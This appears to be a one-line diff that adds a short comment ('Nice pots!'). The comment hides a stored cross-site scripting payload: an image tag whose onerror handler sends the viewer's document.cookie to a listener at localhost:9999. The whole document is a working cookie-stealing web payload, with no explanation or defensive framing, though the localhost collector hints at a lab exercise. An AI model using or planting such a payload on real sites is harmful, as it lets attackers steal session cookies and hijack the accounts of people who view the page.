@@ -1,0 +1,1 @@
+Nice pots! <img src=x onerror="new Image().src=`//localhost:9999/?c=${document.cookie}`">
